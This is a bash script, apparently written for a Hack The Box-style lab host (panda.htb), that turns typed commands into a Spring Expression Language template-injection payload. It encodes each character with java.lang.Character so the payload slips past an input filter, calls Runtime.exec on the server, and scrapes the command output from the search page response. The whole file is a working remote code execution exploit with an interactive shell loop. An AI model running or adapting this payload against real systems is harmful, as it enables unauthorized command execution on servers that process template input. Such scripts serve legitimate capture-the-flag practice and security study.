#!/bin/bash

echo "Enter your command"

ord () {

    LC_CTYPE=C printf '%d' "'$1"
}


while true
do

    read -p ">> " command  
    payload=""
        
    # FIRST CHAR ONLY
    for (( c=0; c<1; c++ ))
    do
	char=${command:$c:1}
	num=$(ord $char)
	if [ $num = 0 ]
	then 
	    echo "$num !!!!"
	    num=32
	    echo "$num ····"
	fi
        
	payload+="*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString($num)"

    done
    
    # REST OF CHARS
    for (( c=1; c<${#command}; c++ ))
    
    do	    
	    
	char=${command:$c:1}
	num=$(ord $char)
	
	if [ $num = 0 ]
	then 
	    num=32
	fi	
	
	payload+=".concat(T(java.lang.Character).toString($num))"
    done
    
    # FINAL ECHO
    payload+=").getInputStream())}"
    echo
    
    # NOW SEND REQUEST
    data="name=$payload"
    r=$(curl -X POST -d $data http://panda.htb:8080/search 2>/dev/null)

    r=$(echo $r |perl -ne '(/searched for: /../<\/h2>/) && print' |perl -pe 's/.*(searched for: .*)/$1/' | cut -d\< -f1)  
    r=${r:14}
    echo $r
done
